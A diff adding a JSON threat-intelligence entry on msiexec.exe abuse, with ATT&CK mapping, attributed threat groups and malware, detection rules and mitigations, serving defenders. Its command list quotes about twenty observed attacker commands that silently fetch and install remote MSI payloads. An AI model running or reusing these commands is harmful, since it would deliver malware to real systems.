@@ -1,0 +1,492 @@
+{
+  "type": "lolbin",
+  "version": 2,
+  "id": "3f679076-cee5-4136-a719-b33182c4b71e",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-17T20:13:00.000Z",
+  "modified": "2026-10-17T20:13:00.000Z",
+  "name": "Msiexec.exe",
+  "image": "msiexec.exe",
+  "description": "Used by Windows to execute msi files",
+  "attack": {
+    "id": "T1218.007",
+    "name": "Msiexec",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1218/007",
+    "version": "20.0"
+  },
+  "summary": [
+    "Proxy execution of malicious payloads",
+    "Launch local or network accessible MSI files",
+    "Execute DLLs",
+    "Bypass application control solutions"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\msiexec.exe",
+    "C:\\Windows\\SysWOW64\\msiexec.exe"
+  ],
+  "hashes": {
+    "MD5": "F3ED0A5EF547D0FB911158D56EF7E27F"
+  },
+  "capabilities": [
+    "Execute"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0005:Stealth:T1218.007"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "APT38 has used `msiexec.exe` to execute malicious files.",
+        "sources": "1 - appv https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "name": "Machete",
+        "attack_id": "G0095",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Machete has used msiexec to install the Machete malware.",
+        "sources": "360 Machete Sep 2020 https://blog.360totalsecurity.com/en/apt-c-43-steals-venezuelan-military-secrets-to-provide-intelligence-support-for-the-reactionaries-hpreact-campaign/"
+      },
+      {
+        "name": "Molerats",
+        "attack_id": "G0021",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Molerats has used msiexec.exe to execute an MSI payload.",
+        "sources": "Unit42 Molerat Mar 2020 https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/"
+      },
+      {
+        "name": "Rancor",
+        "attack_id": "G0075",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Rancor has used msiexec to download and execute malicious installer files over HTTP.",
+        "sources": "Rancor Unit42 June 2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "name": "TA505",
+        "attack_id": "G0092",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "TA505 has used msiexec to download and execute malicious Windows Installer files.",
+        "sources": "Trend Micro TA505 June 2019 https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/; Cybereason TA505 April 2019 https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware; Deep Instinct TA505 Apr 2019 https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+      },
+      {
+        "name": "ZIRCONIUM",
+        "attack_id": "G0128",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.",
+        "sources": "Zscaler APT31 Covid-19 October 2020 https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "3CX Supply Chain Attack",
+        "attack_id": "C0057",
+        "evidence": "uses T1218.007",
+        "description": "During the 3CX Supply Chain Attack, AppleJeus delivered components using a Windows Installer package (.msi). The MSI installer extracted several files and executed the 3CXDesktopApp.exe, which loaded the malicious library file ffmpeg.dll.",
+        "sources": "Unit42 3cx supply chain 2023 https://unit42.paloaltonetworks.com/3cxdesktopapp-supply-chain-attack/"
+      },
+      {
+        "name": "RedDelta Modified PlugX Infection Chain Operations",
+        "attack_id": "C0047",
+        "evidence": "uses T1218.007",
+        "description": "Mustang Panda initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of PlugX during RedDelta Modified PlugX Infection Chain Operations.",
+        "sources": "Recorded Future RedDelta 2025 https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "AppleJeus",
+        "attack_id": "S0584",
+        "evidence": "uses T1218.007",
+        "description": "AppleJeus has been installed via MSI installer.",
+        "sources": "CISA AppleJeus Feb 2021 https://us-cert.cisa.gov/ncas/alerts/aa21-048a"
+      },
+      {
+        "name": "Chaes",
+        "attack_id": "S0631",
+        "evidence": "uses T1218.007",
+        "description": "Chaes has used.MSI files as an initial way to start the infection chain.",
+        "sources": "Cybereason Chaes Nov 2020 https://www.cybereason.com/hubfs/dam/collateral/reports/11-2020-Chaes-e-commerce-malware-research.pdf"
+      },
+      {
+        "name": "Clop",
+        "attack_id": "S0611",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Clop can use msiexec.exe to disable security tools on the system.",
+        "sources": "Cybereason Clop Dec 2020 https://www.cybereason.com/blog/cybereason-vs.-clop-ransomware"
+      },
+      {
+        "name": "DEADEYE",
+        "attack_id": "S1052",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "DEADEYE can use `msiexec.exe` for execution of malicious DLL.",
+        "sources": "Mandiant APT41 https://www.mandiant.com/resources/apt41-us-state-governments"
+      },
+      {
+        "name": "Duqu",
+        "attack_id": "S0038",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Duqu has used msiexec to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.",
+        "sources": "Kaspersky Duqu 2.0 https://web.archive.org/web/20150906233433/https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf"
+      },
+      {
+        "name": "FlawedAmmyy",
+        "attack_id": "S0381",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "FlawedAmmyy has been installed via `msiexec.exe`.",
+        "sources": "Korean FSI TA505 2020 https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+      },
+      {
+        "name": "Grandoreiro",
+        "attack_id": "S0531",
+        "evidence": "uses T1218.007",
+        "description": "Grandoreiro can use MSI files to execute DLLs.",
+        "sources": "Securelist Brazilian Banking Malware July 2020 https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+      },
+      {
+        "name": "IcedID",
+        "attack_id": "S0483",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. IcedID has also used msiexec.exe to deploy the IcedID loader.",
+        "sources": "Trendmicro_IcedID https://www.trendmicro.com/en_us/research/22/l/icedid-botnet-distributors-abuse-google-ppc-to-distribute-malware.html; Juniper IcedID June 2020 https://blogs.juniper.net/en-us/threat-research/covid-19-and-fmla-campaigns-used-to-install-new-icedid-banking-malware"
+      },
+      {
+        "name": "Javali",
+        "attack_id": "S0528",
+        "evidence": "uses T1218.007",
+        "description": "Javali has used the MSI installer to download and execute malicious payloads.",
+        "sources": "Securelist Brazilian Banking Malware July 2020 https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+      },
+      {
+        "name": "Latrodectus",
+        "attack_id": "S1160",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Latrodectus has called `msiexec` to install remotely-hosted MSI files.",
+        "sources": "Bleeping Computer Latrodectus April 2024 https://www.bleepingcomputer.com/news/security/new-latrodectus-malware-attacks-use-microsoft-cloudflare-themes/; Latrodectus APR 2024 https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice"
+      },
+      {
+        "name": "LoudMiner",
+        "attack_id": "S0451",
+        "evidence": "uses T1218.007",
+        "description": "LoudMiner used an MSI installer to install the virtualization software.",
+        "sources": "ESET LoudMiner June 2019 https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/"
+      },
+      {
+        "name": "Maze",
+        "attack_id": "S0449",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.",
+        "sources": "Sophos Maze VM September 2020 https://news.sophos.com/en-us/2020/09/17/maze-attackers-adopt-ragnar-locker-virtual-machine-technique/"
+      },
+      {
+        "name": "Melcoz",
+        "attack_id": "S0530",
+        "evidence": "uses T1218.007",
+        "description": "Melcoz can use MSI files with embedded VBScript for execution.",
+        "sources": "Securelist Brazilian Banking Malware July 2020 https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+      },
+      {
+        "name": "Metamorfo",
+        "attack_id": "S0455",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Metamorfo has used MsiExec.exe to automatically execute files.",
+        "sources": "Fortinet Metamorfo Feb 2020 https://www.fortinet.com/blog/threat-research/another-metamorfo-variant-targeting-customers-of-financial-institutions; ESET Casbaneiro Oct 2019 https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/"
+      },
+      {
+        "name": "Mispadu",
+        "attack_id": "S1122",
+        "evidence": "uses T1218.007",
+        "description": "Mispadu has been installed via MSI installer.",
+        "sources": "ESET Security Mispadu Facebook Ads 2019 https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/; SCILabs Malteiro 2021 https://blog.scilabs.mx/en/cyber-threat-profile-malteiro/"
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "QakBot can use MSIExec to spawn multiple cmd.exe processes.",
+        "sources": "Crowdstrike Qakbot October 2020 https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/"
+      },
+      {
+        "name": "Ragnar Locker",
+        "attack_id": "S0481",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Ragnar Locker has been delivered as an unsigned MSI package that was executed with msiexec.exe.",
+        "sources": "Sophos Ragnar May 2020 https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
+      },
+      {
+        "name": "Raspberry Robin",
+        "attack_id": "S1130",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "Raspberry Robin uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution. Raspberry Robin retrieves its second stage payload in a variety of ways such as through msiexec.exe abuse, or running the curl command to download the payload to the victim's %AppData% folder.",
+        "sources": "TrendMicro RaspberryRobin 2022 https://www.trendmicro.com/en_us/research/22/l/raspberry-robin-malware-targets-telecom-governments.html; RedCanary RaspberryRobin 2022 https://redcanary.com/blog/threat-intelligence/raspberry-robin/; HP RaspberryRobin 2024 https://threatresearch.ext.hp.com/raspberry-robin-now-spreading-through-windows-script-files/"
+      },
+      {
+        "name": "RedLine Stealer",
+        "attack_id": "S1240",
+        "evidence": "uses T1218.007",
+        "description": "RedLine Stealer has been installed via MSI Installer.",
+        "sources": "McAfee RedLine Stealer April 2024 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/redline-stealer-a-novel-approach/"
+      },
+      {
+        "name": "Tsundere Botnet",
+        "attack_id": "S9034",
+        "evidence": "uses T1218.007",
+        "description": "Tsundere Botnet has been distributed via an MSI installer.",
+        "sources": "SecureListUbiedo_Tsundere_Nov2025 https://securelist.com/tsundere-node-js-botnet-uses-ethereum-blockchain/117979/"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "RemoteUtilities",
+        "attack_id": "S0592",
+        "evidence": "uses T1218.007; names msiexec.exe",
+        "description": "RemoteUtilities can use Msiexec to install a service.",
+        "sources": "Trend Micro Muddy Water March 2021 https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html"
+      }
+    ],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]",
+        "intent": "After the Office equation editor exploit runs, the command downloads an installer package (.msi) and installs it; the package drops the backdoor installer UserInstall.exe.",
+        "status": "verified",
+        "source_name": "Trend Micro Tropic Trooper March 2018",
+        "source_url": "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
+      },
+      {
+        "command": "cmd.exe /c msiexec /q /I “hxxps[:]//www[.]uwaoma[.]info/zus.msi",
+        "intent": "Exploitation of CVE-2017-11882 leads to download and installation of the malicious MSI package zus.msi through Windows Installer, which delivers LokiBot.",
+        "status": "verified",
+        "source_name": "Trend Micro LokiBot Windows Installer February 2018",
+        "source_url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/"
+      },
+      {
+        "command": "msiexec /q /i http://199.247.6[.]253/ud",
+        "intent": "A VBScript written by cmd runs msiexec to download and install a second stage payload from the attacker server.",
+        "status": "verified",
+        "source_name": "Unit 42 Rancor June 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "command": "msiexec /q /i http://p=/45.125.65[.]76/abc",
+        "intent": "The VBS file written by the macro downloads a second-stage MSI payload from the attacker server and executes it with msiexec.",
+        "status": "verified",
+        "source_name": "Check Point Rancor Year of the Phish September 2019",
+        "source_url": "https://research.checkpoint.com/2019/rancor-the-year-of-the-phish/"
+      },
+      {
+        "command": "%comspec% /c taskkill /F /IM msiexec.exe & ping 127.0.0.1 -n 2 >NUL & msiexec /i C:\\ProgramData\\PlayerVLC.msi /quiet /qn /norestart",
+        "intent": "The secondary VBScript kills running msiexec.exe instances, waits two seconds with ping, then launches the downloaded PlayerVLC.msi with msiexec.",
+        "status": "verified",
+        "source_name": "Unit 42 Molerats Spark March 2020",
+        "source_url": "https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\msiexec.exe\" back=13 error=continue /i http://92[.]38[.]135[.]99/99.msi /q OnLoad=\"c:\\windows\\notepad.exe",
+        "intent": "The final command of the document macro downloads and installs the .MSI file, a downloader that retrieves and runs the FlawedAmmyy RAT.",
+        "status": "verified",
+        "source_name": "Trend Micro TA505 August 2019",
+        "source_url": "https://www.trendmicro.com/en_us/research/19/h/ta505-at-it-again-variety-is-the-spice-of-servhelper-and-flawedammyy.html"
+      },
+      {
+        "command": "cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client&msiexec /q /i http://103.212.223.210:9900/nvidia.msi&echo [S]&cd&echo [E]",
+        "intent": "Second-stage payload retrieval command sent through a China Chopper web shell on a compromised Exchange server.",
+        "status": "verified",
+        "source_name": "Rapid7 Exchange Zero-Day Attacker Behavior March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\\Pass.txt & start %APPDATA%\\Pass.txt && FOR %i IN (%systemroot%\\system32\\msiexec.*) DO msiexec -c /Q /i hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd",
+        "intent": "Run when the victim opens the shortcut file; it opens the decoy password file and uses msiexec to silently launch the fetched Windows Installer file.",
+        "status": "verified",
+        "source_name": "Kaspersky BlueNoroff MotW Bypass December 2022",
+        "source_url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "command": "msiexec /i %appdata%\\y.msi /qn",
+        "intent": "After the LNK downloads the MSI with PowerShell and renames it to y.msi, it is installed with msiexec.",
+        "status": "verified",
+        "source_name": "Netskope Bumblebee Resurgence October 2024",
+        "source_url": "https://www.netskope.com/blog/new-bumblebee-loader-infection-chain-signals-possible-resurgence"
+      },
+      {
+        "command": "mSIexeC -Q -IhTtP://NT3[.]XyZ:8080/ [11 char long random string] / [computer name] = [username]",
+        "intent": "After delivery, cmd.exe spawns msiexec.exe in quiet mode to download the Raspberry Robin payload, with mixed case letters to bypass detection.",
+        "status": "verified",
+        "source_name": "Cisco Raspberry Robin August 2022",
+        "source_url": "https://blogs.cisco.com/security/raspberry-robin-highly-evasive-worm-spreads-over-external-disks"
+      },
+      {
+        "command": "mSIExec /Q /IhTTP://0Dz[.]Me:8080/ [11 char long random string] / [computer name] = [username]",
+        "intent": "Another mixed-case variant of the quiet msiexec command used to download the Raspberry Robin payload.",
+        "status": "verified",
+        "source_name": "Cisco Raspberry Robin August 2022",
+        "source_url": "https://blogs.cisco.com/security/raspberry-robin-highly-evasive-worm-spreads-over-external-disks"
+      },
+      {
+        "command": "curl -sL \"http://[actor-controlled-ip]/installer\" -o \"SuperOps.msi\" && msiexec /i \"SuperOps.msi\" /quiet",
+        "intent": "Example staging string observed in UNC3753 remote sessions to download and silently install a SuperOps remote management MSI.",
+        "status": "verified",
+        "source_name": "Google Mandiant UNC3753 US Law Firms June 2026",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\cmd.exe\" /c cd /d C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\ & copy c:\\windows\\system32\\curl.exe KFSELqcUm.exe & KFSELqcUm.exe -o qgEYlIKPDYzj.msi https[:]//pittsburgh.soulcarelife[.]org/?sxykn3bjp0rmnaefzc8jb3qc2704 & C:\\Windows\\System32\\msiexec.exe /i qgEYlIKPDYzj.msi /qn",
+        "intent": "Delivery chain 1: a renamed cURL downloads a Windows Installer package that is executed with msiexec.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2975 Malvertising December 2023",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/detecting-disrupting-malvertising-backdoors"
+      },
+      {
+        "command": "msiexec /i C:\\programData\\Y9U68YA55.bin /qn",
+        "intent": "Delivery chain 3: Windows Script Host downloads a Windows Installer package that is run with msiexec.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2975 Malvertising December 2023",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/detecting-disrupting-malvertising-backdoors"
+      },
+      {
+        "command": "msiexec /q /i hxxps://vdfccjpnedujhrzscjtq[.]supabase[.]co/storage/v1/object/public/image/v4.msi",
+        "intent": "On the compromised SharePoint server, w3wp.exe spawned msiexec.exe to silently download and install a remote MSI payload.",
+        "status": "verified",
+        "source_name": "Trend Micro Warlock Attack March 2026",
+        "source_url": "https://www.trendmicro.com/en_us/research/26/c/dissecting-a-warlock-attack.html"
+      },
+      {
+        "command": "C:\\windows\\system32\\msiexec.exe /i hxxps[://www[.tightvnc[.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit[.msi /q /norestart ADDLOCAL=Server SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=[REDACTED]",
+        "intent": "PsExec was used to run msiexec so that TightVNC was downloaded and installed from a remote location.",
+        "status": "verified",
+        "source_name": "Trend Micro Warlock Attack March 2026",
+        "source_url": "https://www.trendmicro.com/en_us/research/26/c/dissecting-a-warlock-attack.html"
+      },
+      {
+        "command": "msiexec /i https://onlineview365[.]com/propi.msi /quiet /norestart",
+        "intent": "The downloaded PIF file only invokes msiexec to download and execute an MSI installer hosted on an attacker-registered web address.",
+        "status": "verified",
+        "source_name": "Huntress DarkMe RAT September 2026",
+        "source_url": "https://www.huntress.com/blog/darkme-rat-abandons-exploits"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cmd.exe /c msiexec.exe /q /i https[:]//aeroclubofindia[.]co[.]in/css/NCERT-Whatsapp-Advisory/winc",
+        "intent": "The deobfuscated shortcut command downloads and installs an MSI payload from a remote server.",
+        "status": "verified",
+        "source_name": "CYFIRMA APT36 LNK MSI December 2025",
+        "source_url": "https://www.cyfirma.com/research/apt36-lnk-based-malware-campaign-leveraging-msi-payload-delivery/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\msiexec.exe\" step=six done=false /i http://local365office.com/content /q change=false",
+        "intent": "The macro in the phishing document runs this command; /q makes msiexec run in the background while it downloads and loads an MSI binary.",
+        "status": "verified",
+        "source_name": "Cyberint Retailers Spear-Phishing December 2018",
+        "source_url": "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf"
+      },
+      {
+        "command": "msiexec.exe next=back error=shutdown /i http://office365onlinehome.com/host32 /q OnChange=\"c:\\windows\\system32\"",
+        "intent": "A second malicious document runs similar msiexec command line artifacts that download an MSI installer from office365onlinehome.com.",
+        "status": "verified",
+        "source_name": "Cyberint Retailers Spear-Phishing December 2018",
+        "source_url": "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4688,
+        "data_components": "Process Creation",
+        "techniques": "T1218.007"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 3,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1218.007"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1218.007"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 22,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1218.007"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Msiexec.EXE Initiated Network Connection Over HTTP",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/network_connection/net_connection_win_msiexec_http.yml"
+      },
+      {
+        "title": "DllUnregisterServer Function Call Via Msiexec.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_dll.yml"
+      },
+      {
+        "title": "Suspicious Msiexec Execute Arbitrary DLL",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_execute_dll.yml"
+      },
+      {
+        "title": "Msiexec Quiet Installation",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml"
+      },
+      {
+        "title": "Suspicious Msiexec Quiet Install From Remote Location",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml"
+      },
+      {
+        "title": "Potential MsiExec Masquerading",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml"
+      },
+      {
+        "title": "MsiExec Web Install",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml"
+      }
+    ],
+    "related_sigma_rules": 53,
+    "other_rules": [
+      "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml",
+      "https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml"
+    ]
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1218.007"
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1218.007"
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/techniques/T1218/007",
+    "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/",
+    "https://strontic.github.io/xcyclopedia/library/msiexec.exe-F3ED0A5EF547D0FB911158D56EF7E27F.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
